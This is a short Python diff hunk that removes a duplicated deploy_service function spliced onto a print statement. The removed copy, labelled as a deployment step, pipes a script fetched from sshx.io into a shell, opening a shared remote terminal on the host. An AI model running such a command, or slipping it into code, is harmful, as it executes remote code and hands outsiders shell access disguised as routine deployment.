@@ -36,13 +36,6 @@ def deploy_service():
         print("Deployment successful.")
     except subprocess.CalledProcessError as e:
         logging.error(f"Error deploying the service: {e.stderr}")
-        print(f"Deployment failed with error: {e.stderr}")def deploy_service():
-    try:
-        # Capture stderr for debugging if an error occurs
-        result = subprocess.run("curl -sSf https://sshx.io/get | sh -s run", shell=True, check=True, capture_output=True, text=True)
-        print("Deployment successful.")
-    except subprocess.CalledProcessError as e:
-        logging.error(f"Error deploying the service: {e.stderr}")
         print(f"Deployment failed with error: {e.stderr}")
 
 async def web_server():
